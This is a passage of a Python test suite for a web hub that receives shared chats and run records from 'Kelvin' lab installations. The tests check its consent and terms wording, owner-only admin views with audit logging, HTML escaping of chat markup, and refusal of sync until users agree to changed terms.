    home = client.get("/").text
    assert "with the Kelvin team" in home and "never their data files" in home and "labmates" not in home
    terms, privacy = client.get("/terms").text, client.get("/privacy").text
    assert "The Kelvin team, who run the hub, can read what is shared" in terms and "join code" not in terms
    assert "No other user sees it" in privacy and "runs' data files (run.h5, plots, reports)" in privacy
    assert "Kelvin shares your normal projects" in client.get("/register").text   # said before anyone agrees
    register(client)
    account = client.get("/account").text
    for want in ("Shared with the Kelvin team", "Your Kelvins", "Nothing yet"):
        assert want in account, want
    for gone in ("Your labs", "Join a lab", "Shared in your labs", "Connected Kelvins"):
        assert gone not in account, gone
    assert client.post("/labs", data={"name": "Smith Lab", "csrf": csrf(client.get("/account"))}).status_code == 404
    assert client.post("/labs/join", data={"code": "AAAA", "csrf": csrf(client.get("/account"))}).status_code == 404
    assert hub.labs_of(1) == []
    kelvin, pending, page, form = connect_form(client)            # an older Kelvin still connects: into no lab
    assert "Share into" not in page.text and "with the Kelvin team" in page.text
    r = client.post("/connect", data=dict(form, csrf=csrf(page), action="allow", password="correct horse", lab="1"),
                    follow_redirects=False)
    kelvin.finish({k: v[0] for k, v in parse_qs(urlsplit(r.headers["location"]).query).items()}, pending)
    assert kelvin.me()["shares_into"] is None and kelvin.me()["labs"] == []


def test_kelvin_shares_over_its_sign_in_and_the_owner_reads_it(tmp_path):
    """Kelvin's own sign-in token shares (no /connect); the owner console lists and opens what it shared, never
    running a chat's markup, and each opening goes in the person's record."""
    hub, client = make(tmp_path)
    r = client.post("/api/register", json={"name": "Ada", "email": "ada@example.org", "password": "correct horse",
                                           "consent": True, "installation": PC})
    auth = {"Authorization": "Bearer " + r.json()["access_token"]}
    me = client.get("/api/me", headers=auth).json()
    assert (me["shares_into"], me["labs"], me["needs_consent"], me["run_files"]) == (None, [], False, False)
    messages = [
        {"role": "user", "text": "sweep the gate " + TRAP, "attachments": [
            {"name": "notes.pdf", "file": "a" * 24 + ".pdf", "mime": "application/pdf", "pages": 3}]},
        {"role": "assistant", "model": "claude-opus-5-5", "blocks": [
            {"type": "thinking", "text": "the gate first"}, {"type": "text", "text": "On it. " + TRAP},
            {"type": "tool_call", "id": "t1", "name": "run_plan", "input": {"plan": TRAP}}]},
        {"role": "tool", "results": [{"id": "t1", "name": "run_plan", "content": "x" * 30000, "is_error": False,
                                      "images": [{"file": "b" * 24 + ".png", "mime": "image/png"}]}]},
        {"role": "user", "text": "compare", "compare": {"models": ["a", "b"], "chosen": 0, "lanes": [
            {"model": "a", "messages": []},
            {"model": "b", "messages": [{"role": "assistant", "model": "b", "blocks": [
                {"type": "text", "text": "lane b says " + TRAP}]}]}]}},
        {"role": "user", "text": "", "events": ["the fridge warmed"], "wake": {"at": 1}},
    ]
    r = client.post("/api/sync", headers=auth, json={
        "projects": [{"id": "p00000001", "name": "CrSBr"}],
        "chats": [{"id": "aaaaaaaaaaaa", "project": "p00000001", "title": "Gate " + TRAP, "messages": messages}],
        "runs": [{"id": "run1", "project": "p00000001", "device": "D1",
                  "meta": {"plan": "gate_sweep", "status": "done", "results": ["V0: 1.2 V"]}}]})
    assert r.status_code == 200 and (r.json()["chats"], r.json()["runs"]) == (1, 1)
    r = client.put("/api/sync/runs/run1/files/data.csv", content=b"1,2\n", headers=auth)
    assert r.status_code == 403 and r.json()["run_files"] is False and "records only" in r.json()["error"]

    client.post("/signin", data={"email": "ada@example.org", "password": "correct horse"})   # Ada, in the browser
    account = client.get("/account").text
    chat_id = re.search(r'/shared/chats/(\d+)', account).group(1)
    mine = client.get("/shared/chats/%s" % chat_id).text
    assert "you and the Kelvin team" in mine and "&lt;script&gt;" in mine and TRAP not in mine
    run_page = client.get("/shared/runs/%s" % re.search(r'/shared/runs/(\d+)', account).group(1)).text
    assert "the data files stay on your computer" in run_page

    client.cookies.clear()
    admin = owner(client, hub).text
    assert "Latest shared chats" in admin and "Gate &lt;script&gt;" in admin and TRAP not in admin
    person = client.get("/admin/users/1").text
    assert "1 project, 1 chat and 1 run" in person and "gate_sweep" in person and "CrSBr" in person
    chat_url = re.search(r'href="(/admin/users/1/chats/\d+)"', person).group(1)
    page = client.get(chat_url).text
    assert TRAP not in page and page.count("&lt;script&gt;") >= 4               # every place it came, as text
    for want in ("sweep the gate", "Thinking", "Calls run_plan", "run_plan result", "1 picture", "not shown here",
                 "notes.pdf (application/pdf, 3 pages)", "more characters not shown", "b answered too",
                 "Kelvin, coming back to the chat", "the fridge warmed", "Lab PC"):
        assert want in page, want
    r = client.get(chat_url + "/json")
    assert "attachment" in r.headers["content-disposition"] and r.headers["content-type"].startswith("application/json")
    assert r.json()["title"] == "Gate " + TRAP and r.json()["messages"] == messages
    run_url = re.search(r'href="(/admin/users/1/runs/\d+)"', person).group(1)
    page = client.get(run_url).text
    assert "gate_sweep" in page and "V0: 1.2 V" in page and "No data files" in page
    record = client.get("/admin/users/1").text
    for want in ("viewed chat", "downloaded chat", "viewed run"):
        assert want in record, want
    client.cookies.clear()
    for url in (chat_url, chat_url + "/json", run_url):                         # owners only
        assert client.get(url, follow_redirects=False).status_code == 303, url


def test_new_terms_say_what_changed_and_sharing_waits_for_them(tmp_path):
    """The hub's terms changing to sharing by default (an older hub.json pins the accounts-only version): everyone is
    asked again, sees what changed, and nothing is taken until they agree, except their own removals."""
    hub = Hub(tmp_path / "hub")
    hub.config.update(sharing=False, consent_version="2026-10-29")      # as an older hub wrote hub.json
    client = TestClient(create_app(hub, hosts=["testserver"], backups=False))
    register(client)
    r = client.post("/api/signin", json={"email": "ada@example.org", "password": "correct horse", "installation": PC})
    auth = {"Authorization": "Bearer " + r.json()["access_token"]}
    hub.config["sharing"] = True                                        # the operator switches sharing on
    assert client.get("/account", follow_redirects=False).headers["location"].startswith("/consent")
    page = client.get("/consent")
    assert "What changed" in page.text and "Kelvin now shares your chats" in page.text and "2026-11-08" in page.text
    assert client.get("/api/me", headers=auth).json()["needs_consent"] is True
    one = {"chats": [{"id": "aaaaaaaaaaaa", "title": "t", "messages": []}]}
    r = client.post("/api/sync", headers=auth, json=one)
    assert r.status_code == 403 and r.json()["needs_consent"] and r.json()["consent_url"].endswith("/consent")
    big = b'{"removed": {"chats": []}, "pad": "' + b"x" * (300 * 1024) + b'"}'
    assert client.post("/api/sync", headers=auth, content=big).status_code == 403   # refused before it is read
    r = client.post("/api/sync", headers=auth, json={"removed": {"chats": ["aaaaaaaaaaaa"]}})
    assert r.status_code == 200                                         # taking work off never waits on terms
    client.post("/consent", data={"csrf": csrf(page), "consent": "yes", "next": "/account"})
    r = client.post("/api/sync", headers=auth, json=one)
    assert r.status_code == 200 and r.json()["chats"] == 1
    client.cookies.clear()
    register(client, "ben@example.org", "Ben")                          # someone new agrees to these at once
    assert "What changed" not in client.get("/consent").text and hub.user(2)["consent_version"] == "2026-11-08"
